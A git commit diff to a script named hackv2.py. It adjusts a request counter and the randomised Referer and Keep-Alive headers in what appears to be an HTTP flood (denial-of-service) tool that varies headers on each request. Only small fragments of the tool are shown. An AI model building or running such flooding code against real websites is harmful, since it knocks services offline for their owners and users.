313208b9676cd66fca9a33cdb2a4de5932a03bca
sikarion <57816950+sikarion@users.noreply.github.com>
2020-11-03 20:07:51 +0100

    Update hackv2.py

--- hackv2.py
+++ hackv2.py
@@ -27,7 +27,7 @@ safe=0
 
 def inc_counter():
 	global request_counter
-	request_counter+=999
+	request_counter+=1
 
 def set_flag(val):
 	global flag
@@ -3951,8 +3951,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
-	request.add_header('Keep-Alive', random.randint(110,160))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
